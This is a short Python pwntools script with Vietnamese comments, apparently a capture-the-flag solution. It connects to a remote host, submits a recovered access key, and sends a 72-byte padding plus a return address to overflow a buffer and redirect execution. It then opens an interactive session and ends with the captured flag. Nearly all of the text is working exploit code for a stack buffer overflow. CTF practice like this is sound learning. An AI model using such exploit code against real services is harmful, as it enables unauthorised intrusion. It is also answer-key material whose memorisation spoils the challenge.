from pwn import *

# Cấu hình mục tiêu (thay đổi đường dẫn file binary hoặc host/port tương ứng)
p = remote('162.243.44.232', 5000)

# 1. Đoạn 1: Vượt qua hàm check_token (như đã phân tích ở trên)
# Key chính xác được tìm ra bằng script giải ngược mảng target
key = b"B4RB13-C0R3GL4M!"

# 2. Đoạn 2: Khai thác lỗ hổng Buffer Overflow tại vulnerable_prompt
# Khoảng cách từ buffer tới Return Address là 72 bytes
offset = 72

# Thay thế bằng địa chỉ thực tế của hàm mục tiêu (ví dụ: elf.symbols['win'])
target_address = 0x4013c3  

# Xây dựng payload: [Key hợp lệ] + [\n] + [Padding 72 bytes] + [Địa chỉ đích]
payload = b"A" * offset + p64(target_address)

# Gửi dữ liệu theo kịch bản tương tác của chương trình
# Gửi key để qua hàm check_token
p.sendlineafter(b"code> ", key) 

# Gửi payload tràn bộ đệm khi chương trình yêu cầu profile packet
p.sendlineafter(b"pilot> ", payload)

# Giữ kết nối để nhận flag hoặc shell
p.interactive()

bitctf{{b4rb13_buff3r_b10w0u7}}